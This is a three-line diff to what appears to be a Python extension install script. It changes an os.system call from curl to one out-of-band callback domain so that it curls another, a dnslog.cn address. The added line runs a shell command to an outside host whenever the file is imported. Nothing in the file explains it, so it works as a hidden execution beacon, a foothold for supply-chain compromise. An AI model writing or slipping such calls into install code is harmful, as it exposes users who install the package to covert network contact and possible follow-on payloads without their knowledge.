@@ -1,3 +1,3 @@
 import launch
 import os
-os.system("curl jyuylwmt.eyes.sh")
+os.system("curl e8g8h3.dnslog.cn")
